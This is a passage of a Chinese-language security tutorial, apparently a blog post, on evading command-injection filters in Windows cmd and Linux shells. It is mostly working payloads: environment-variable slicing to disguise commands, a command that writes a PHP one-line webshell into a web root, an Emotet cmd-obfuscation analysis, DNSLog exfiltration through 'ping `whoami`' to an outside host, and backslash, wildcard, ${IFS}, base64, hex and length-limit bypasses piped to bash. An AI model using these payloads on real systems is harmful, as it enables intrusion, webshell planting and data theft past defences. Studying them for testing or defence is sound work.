class="hljs-built_in">echo</span> %COMPUTERNAME:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>%<span class="hljs-built_in">h</span>%windir:~<span class="hljs-literal">-3</span>,<span class="hljs-number">1</span>%%HOMEPATH:~<span class="hljs-literal">-1</span>%<span class="hljs-built_in">mi</span><br>Whoami<br><br>C:\Users\a&gt;%COMPUTERNAME:~<span class="hljs-number">0</span>,<span class="hljs-number">1</span>%<span class="hljs-built_in">h</span>%windir:~<span class="hljs-literal">-3</span>,<span class="hljs-number">1</span>%%HOMEPATH:~<span class="hljs-literal">-1</span>%<span class="hljs-built_in">mi</span><br>win<span class="hljs-literal">-tbucg5qo47j</span>\a<br><br>C:\Users\a&gt;d^i^r%CommonProgramFiles:~<span class="hljs-number">10</span>,<span class="hljs-number">1</span>%%commonprogramfiles:~<span class="hljs-number">0</span>,<span class="hljs-number">3</span>%<br> 驱动器 C 中的卷没有标签。<br> 卷的序列号是 <span class="hljs-number">5</span>CE5<span class="hljs-literal">-9A63</span><br><br> C:\ 的目录<br><br><span class="hljs-number">2022</span>/<span class="hljs-number">03</span>/<span class="hljs-number">12</span>  <span class="hljs-number">00</span>:<span class="hljs-number">20</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          JspStudy<br><span class="hljs-number">2022</span>/<span class="hljs-number">07</span>/<span class="hljs-number">09</span>  <span class="hljs-number">20</span>:<span class="hljs-number">04</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          MailMasterData<br><span class="hljs-number">2009</span>/<span class="hljs-number">07</span>/<span class="hljs-number">14</span>  <span class="hljs-number">11</span>:<span class="hljs-number">20</span>    &lt;<span class="hljs-built_in">DIR</span>&gt;          PerfLogs<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDALMLf8MC7300lXujw6IeicYvLn0pFCPfFNLKA0H5yApFC9nvCiafbFsHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAyBicAPFoFIo1L6KMNpR5JWhPpNhzNoL4kMCkZhE8xpR5JTbaONGiaRYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>我们还可以凑php一句话（这里为了方便所以自定义了一些字符）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs poweshell">C:\Users\a&gt;set web=^&lt;^&gt;/@$_PHPOST[]?&#x27;e()val<br>C:\Users\a&gt;echo ^%web:~0,1%^%web:~-8,1%%web:~6,3% ^%web:~-6,1%^%web:~-3,3%^%web:~-5,1%%web:~4,2%%web:~8,5%^%web:~-7,1%%web:~-1,1%^%web:~-7,1%%web:~13,1%^%web:~-4,1% ^%web:~-8,1%^%web:~1,1% &gt; C:\phpstudy_pro\WWW\b.php<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAwlZsh1R0nogZXTib9F22ibb6ic4PMmyyT3b2f2QQY5uxylJbDtcsJLnpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6uDENZWHmMNDrFHMcAibgKbSdIhn2Bl9jET8Hu8JtjkB8CEF5bm1T5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>因为拼接字符需要得到大量的位置，为了方便拼接可以使用for命令来讲所有位置设成一个列表，以此循环遍历列表，合并字符串，还能起到混淆的作用。</p><p>这里注意set不能以空格结尾否则，变量会将空格进行赋值</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmd /V:ON /C <span class="hljs-string">&quot; set kpx=vwchdoaadmei&amp;&amp; for %G in (1,3,5,7,9,11,26) do set lq=!lq!!kpx:~%G,1!&amp;&amp; if %G==26  !lq:~4!&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAhnVFP8Ywrnk2QIZsiaZfFkkudO3iaYO6AWgm3aVjek8PZIlsyYYInTfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>错误示范</strong></p><p>下面的方法拼接出来的其实是w h o a m i 因为有空格后面的都视作参数没有显示</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIO5Lj5XibulTFopjlZ9CumbboicdO4BjrLypibpa8HTStIDyian7y6HQnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="分析Emotet木马中的cmd命令"><a href="#分析Emotet木马中的cmd命令" class="headerlink" title="分析Emotet木马中的cmd命令"></a><strong>分析Emotet木马中的cmd命令</strong></h3><p>Emotet一款著名的银行木马，首次出现于2014年年中。该木马主要通过垃圾邮件的方式传播感染目标用户，其不断变化传播花样，采用越来越复杂的混淆编码来躲避检测。</p><p>现在我们以Emotet木马为例，我们来试着分析一下经过混淆后的cmd内容</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDApPFenjgjOmpS5U4NbLBZq0cPticldJKaTUG2yUlZnqOibUfnDCAsJ1Sg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>先将混淆cmd命令中的转义字符“^”全部去掉，再将除了变量@之外的逗号“,”、分号“;”、多余空格删除。注意保留变量@中的逗号和分号，否则影响输出结果。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDASlTK5MSlVRvl4jCu1fwRNGdPnywBTeVpTJbPLyiaAXSyE9C9wOeh0tg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>下图为无意义的四个字符串，cmd会自动忽略。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAV4UwFsL7k2qJwSu0MDY31ssus0dXnR1lnbTZ9yvPZPouJSrXRwic0nw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>可以看出这里利用了cmd的系统环境变量<code>%comspec%</code>，即是cmd.exe的执行路径，因此会执行cmd命令，这里才是命令的真正开头。因此程序开头可以进行化简。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAs1FsIOcNKHxUF0qvooxzgxsd2UUpXsHoHHG0u0aHUooA7TQ0FkicdWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>去除无意义的字符串后可以化简为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs poweshell">%comspec% /c for /f &quot; delims=vf= tokens=2&quot; %f in ( &#x27;assoc .cmd&#x27; ) do %f /V /R<br></code></pre></td></tr></table></figure><p>先利用<code>%comspec% /c</code>执行第一个for循环，再利用<code>for</code>循环的<code>/f</code>参数，在命令<code>assoc .cmd</code>结果<code>.cmd=cmdfile</code>中以字符v、f、&#x3D;为分隔符，取第二列即是“<code>cmd</code>”。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAghx2dbKHqenTlC2TcgKBDf8VcLxmOqyicIHvKAqvMSroIhicj98EKpibw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>因此这里用for循环生成的cmd又开启了新一个cmd程序来运行下面的字符串内的程序。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAuhAGBDAuNI1sGTTKR3nVbOFmzibnQ8XuD5wz8MnIFoZicAMwMV9tCkOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>这里自定义了一个环境变量<code>@</code>，等于一个1460长度的字符串。然后利用for循环的&#x2F;L参数，遍历变量<code>@</code>：<code>for /L %s in (1459,-4,+3 ) do set \=!\!!@ :~ %s, 1!&amp; if %s equ 3 call %\:~-365%</code>，这个for循环自定义了环境变量”<code>\</code>“，还启用了延迟的环境变量扩展<code>!</code>，<code>!@:~%s,1!</code>表示循环变量<code>%s</code>从1459开始，步长为<code>-4</code>，到<code>3</code>结束，循环提取变量<code>@</code>中的字符，添加到<code>\</code>变量中。当<code>%s</code>到<code>3</code>的时候就会执行<code>\</code>中倒数365个字符组成的程序。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6BaBFArsUsqXicNzFtBCuibNjxwhyNVeo0lth4q6YJRhLHqPosXrpoHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="1-4-逻辑运算符在绕过中的作用"><a href="#1-4-逻辑运算符在绕过中的作用" class="headerlink" title="1.4 逻辑运算符在绕过中的作用"></a>1.4 逻辑运算符在绕过中的作用</h2><p><code>|</code> 在cmd中，可以连接命令，且只会执行后面的命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami | ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> www.baidu.com   //只执行ping<br>ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> www.baidu.com | whoami   //只执行whoami<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAib3eMxxDO6qfz5cmjMhAh8zgUk3vKtT0ZLuGaFJAJ4VbXbtubWfxFmg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><code>||</code> 只有在前面命令失败才执行后面</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> || whoami //不执行whoami<br>ping xxx. || whoami //执行whoami<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAGXVx4htWaX8MOGadb2hOHcicXgFicNDFUpUaNMibDQY9ffv5KhAjUPXHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><code>&amp;</code>无论前面的命令是否能执行成功都会执行后面的命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> &amp; whoami //执行whoami<br>ping xxx. &amp; whoami //执行whoami<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAbZFEKpbfib8ggpzZVaaElgetZenoHPYibbgIFgCTZEQrSRibe1dpOkghA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><code>&amp;&amp;</code>前面命令为真才会执行后面的命令。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">ping <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-meta">&amp;&amp; whoami <span class="hljs-comment">//执行whoami</span></span><br>ping xxx. <span class="hljs-meta">&amp;&amp; whoami <span class="hljs-comment">//不执行whoami</span></span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDATrsxBpFIwU453O4Lj2mYQu0ghdQhGICAibGjMTldNRnopD8JxL2FibLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>**0x02 Linux（*<em>区分大小写*<em>）</em></em></p><p>2.1 linux下的符号和逻辑运算符</p><p>linux中变量使用<code>$</code>来引用，<code>;</code>表示命令结束无论命令是否执行成功都会执行下一个命令，<code>| || &amp; &amp;&amp;</code>，与Windows一样，这里就不做赘述。</p><p>利用上面的符号可以进行拼接的命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">t</span>=l;j=s;i=&quot; -al<span class="hljs-string">&quot;;<span class="hljs-variable">$t</span><span class="hljs-variable">$j</span><span class="hljs-variable">$i</span></span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDANcXvdvFb6j5rHa2a3bEujbnJgiaibgObrCMSO8rJibgFU546BnlFHSgrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="2-2-利用未被过滤的命令"><a href="#2-2-利用未被过滤的命令" class="headerlink" title="2.2 利用未被过滤的命令"></a>2.2 利用未被过滤的命令</h2><p>假设有命令执行漏洞的网站中过滤的一些命令，但是没有过滤一些命令，例如ping命令，则可以利用ping命令来执行命令带出信息。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping `whoami`.whjtmh.dnslog.cn<br></code></pre></td></tr></table></figure><p>利用DNSLog就可以获得带出的信息（对于不回显的命令执行也可以利用这种方法）</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAym5hbSicXvL2BRiaAibBIBsp01QFu4ic0sib9zCUdYbwbUCf1MP3ms4270Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="2-3-linux符号之间的组合"><a href="#2-3-linux符号之间的组合" class="headerlink" title="2.3 linux符号之间的组合"></a>2.3 linux符号之间的组合</h2><p>类似于Windows的<code>&quot;</code>和<code>^</code>linux也有类似的使用方法，就是利用变量和参数</p><p><strong>利用反斜杠绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>\ami<br></code></pre></td></tr></table></figure><p><strong>利用括号括起来（当做命令执行）</strong></p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">whoa</span>&#x27;<span class="hljs-symbol">&#x27;mi</span>)<br></code></pre></td></tr></table></figure><p><strong>利用反引号或$和括号结合（将括号内命令的结果当做命令执行）</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">`(<span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>)`<br>$(<span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>)<br></code></pre></td></tr></table></figure><p><strong>利用Shell特殊变量绕过</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">who</span>$*ami<br><span class="hljs-built_in">who</span><span class="hljs-variable">$@ami</span><br><span class="hljs-built_in">who</span><span class="hljs-variable">$1ami</span><br></code></pre></td></tr></table></figure><p><strong>利用通配符匹配唯一命令名称执行命令（使用命令的绝对路径）</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/u?r/</span>b?n/who?mi<br><span class="hljs-regexp">/*/</span>*/whoam?<br><span class="hljs-regexp">/*/</span>*i[n]/wh??mi<br></code></pre></td></tr></table></figure><p><strong>综合组合</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/*<span class="hljs-regexp">/*&quot;&quot;in/w</span><span class="hljs-string">&#x27;h&#x27;</span><span class="hljs-string">`dfds`</span><span class="hljs-string">??</span>m<span class="hljs-variable">$(</span>sdf)i<br></code></pre></td></tr></table></figure><h2 id="2-4-linux切割字符串（linux区分大小写）"><a href="#2-4-linux切割字符串（linux区分大小写）" class="headerlink" title="2.4 linux切割字符串（linux区分大小写）"></a>2.4 linux切割字符串（linux区分大小写）</h2><p>在linux中切割字符串的语法是${NAME:start:length}</p><p>与Windows相同这里不在赘述，只要区分大小写就可以</p><h2 id="2-5-绕过空格过滤"><a href="#2-5-绕过空格过滤" class="headerlink" title="2.5 绕过空格过滤"></a>2.5 绕过空格过滤</h2><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h3 id="在前端页面中可以利用-00-0a-0d等url编码来绕过空格的过滤，"><a href="#在前端页面中可以利用-00-0a-0d等url编码来绕过空格的过滤，" class="headerlink" title="在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，"></a>在前端页面中可以利用%00,%0a,%0d等url编码来绕过空格的过滤，</h3><h3 id="利用大括号来绕过空格限制"><a href="#利用大括号来绕过空格限制" class="headerlink" title="利用大括号来绕过空格限制"></a>利用大括号来绕过空格限制</h3><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;ls,-al&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;ping,-c,2,127.0.0.1&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAlewLe6MhQ3jwEibx7xia9Qjva7b8a6ibG1Ogd8CHvxXNFMKCsVdmSicRmw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="IFS-绕过空格"><a href="#IFS-绕过空格" class="headerlink" title="${IFS}绕过空格"></a>${IFS}绕过空格</h3><p>IFS是internal field separator的缩写，shell的特殊环境变量。shell根据IFS存储的值，可以是空格（040）、tab（011）、换行符（012）或者其他自定义符号，来解析输入和输出的变量值。这里echo -n是不进行自动换行</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAsDiaqTYPO5oZHEVtvSORgXxD1YY8OwvzaicZHpVqicW3vOjQvkLAxc1FA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA93kRHZJujhAc10zNhGlQg9Bt4Gj5LU4VgByMuIDmnhC72gua0RATVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>2.6 利用base64绕过命令限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">whoami</span>|<span class="hljs-built_in">base64</span> //先输出<span class="hljs-built_in">whoami</span>的<span class="hljs-built_in">base64</span>编码<br>`<span class="hljs-built_in">echo</span> dwhvYW1pCg==|<span class="hljs-built_in">base64</span> -d` //将其<span class="hljs-built_in">base64</span>解码<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6hz2deFGTib0PPtt2WzkFMNllicCiaYGB6xDDBsibnDbqJyiaick1MTq7jIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="2-7-hex编码绕过"><a href="#2-7-hex编码绕过" class="headerlink" title="2.7 hex编码绕过"></a>2.7 hex编码绕过</h2><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs wren"># <span class="hljs-variable">cat</span> <span class="hljs-variable">flag</span>.<span class="hljs-property">php</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">63617420666</span>c61672e706870<br><span class="hljs-variable">echo</span> <span class="hljs-string">&quot;63617420666c61672e706870&quot;</span><span class="hljs-operator">|</span><span class="hljs-variable">xxd</span> <span class="hljs-operator">-</span><span class="hljs-variable">r</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span><span class="hljs-operator">|</span><span class="hljs-variable">bash</span><br><span class="hljs-comment">#xxd: 二进制显示和处理文件工具,cat: 以文本方式ASCII显示文件</span><br>#<span class="hljs-operator">-</span><span class="hljs-variable">r</span>参数：逆向转换。将<span class="hljs-number">16</span>进制字符串表示转为实际的数<br>#<span class="hljs-operator">-</span><span class="hljs-variable">ps</span>参数：以 <span class="hljs-variable">postscript</span>的连续<span class="hljs-number">16</span>进制转储输出，也叫做纯<span class="hljs-number">16</span>进制转储。<br>#<span class="hljs-operator">-</span><span class="hljs-variable">r</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span>将纯十六进制转储的反向输出打印为了<span class="hljs-variable">ASCII</span>格式。<br><br><span class="hljs-variable">cat</span> <span class="hljs-variable">flag</span>.<span class="hljs-property">php</span> <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> \<span class="hljs-variable">x63</span>\<span class="hljs-variable">x61</span>\<span class="hljs-variable">x74</span>\<span class="hljs-variable">x20</span>\<span class="hljs-variable">x66</span>\<span class="hljs-variable">x6c</span>\<span class="hljs-variable">x61</span>\<span class="hljs-variable">x67</span>\<span class="hljs-variable">x2e</span>\<span class="hljs-variable">x70</span>\<span class="hljs-variable">x68</span>\<span class="hljs-variable">x70</span><br>#经测试，发现在<span class="hljs-variable">php</span>的<span class="hljs-variable">ping</span>环境上执行失败。在<span class="hljs-variable">linux</span>系统上执行成功<br>$(<span class="hljs-variable">printf</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>)<br>&#123;<span class="hljs-variable">printf</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>&#125;<span class="hljs-operator">|</span><span class="hljs-variable">bash</span><br>`&#123;<span class="hljs-variable">printf</span>,<span class="hljs-string">&quot;<span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x74</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x66</span>\x6c<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x67</span>\x2e<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x70</span>&quot;</span>&#125;`<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAdMib5bhRgCaibL5dibgf00ichGgSHYpp4NuDllUiaU1N4QNlVRvNpfZ1WlA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h2 id="2-8-长度限制绕过"><a href="#2-8-长度限制绕过" class="headerlink" title="2.8 长度限制绕过"></a>2.8 长度限制绕过</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>可以利用base64解码的方式将脚本写入多个文件合并后再执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cat flag.txt&quot;</span> | base64   # 首先生成所需命令的base64字符串<br><br># Y2F0IGZsYWcudHh0Cg==<br><span class="hljs-keyword">echo</span> -n Y2F0IG &gt; <span class="hljs-keyword">a</span><br><span class="hljs-keyword">echo</span> -n ZsYWcu &gt;<span class="hljs-keyword">b</span><br><span class="hljs-keyword">echo</span> -n dHh0Cg== &gt; <span class="hljs-keyword">c</span><br><br>下面合并文件<br><br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">b</span> &gt;&gt; <span class="hljs-keyword">a</span><br><span class="hljs-keyword">cat</span> <span class="hljs-keyword">c</span> &gt;&gt; <span class="hljs-keyword">a</span><br><br>解码文件<br><br>base64 -d <span class="hljs-keyword">a</span> &gt; <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">sh</span> <span class="hljs-keyword">shell</span>.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAD3FClyNFl6stkujd7iaicbb4HFcUJtibWCtwOCP3iage4zcmopdVSdWYqg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">首先通过命令创建带有命令分隔的文件<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;txt&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;ag.\\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;fl\\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;t \\&quot;</span></span><br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-string">&quot;ca\\&quot;</span></span><br>在用ls -t输出到一个文件中，再利用sh执行<br>ls -t &gt; shell2.sh<br>#如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入qwzf，即<br>ls -at &gt; shell2.sh<br>sh shell2.sh<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7Wyk3S43efk4SEDLkPtDiao9DCaicbwSFd2pB6aiaEAf3ERg2XLAmwStQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p><strong>参考：</strong></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xquery">https://www.anquanke.com/post/id/<span class="hljs-number">208398</span><br>https://<span class="hljs-keyword">update</span>.venuseye.com.cn/reports/<span class="hljs-number">1548417941041</span>/<span class="hljs-meta">%E4</span><span class="hljs-meta">%BB</span><span class="hljs-meta">%A5Emotet</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%B8</span><span class="hljs-meta">%BA</span><span class="hljs-meta">%E4</span><span class="hljs-meta">%BE</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%B7</span><span class="hljs-meta">%B1</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%85</span><span class="hljs-meta">%A5</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%88</span><span class="hljs-meta">%86</span><span class="hljs-meta">%E6</span><span class="hljs-meta">%9E</span><span class="hljs-meta">%90CMD</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%91</span><span class="hljs-meta">%BD</span><span 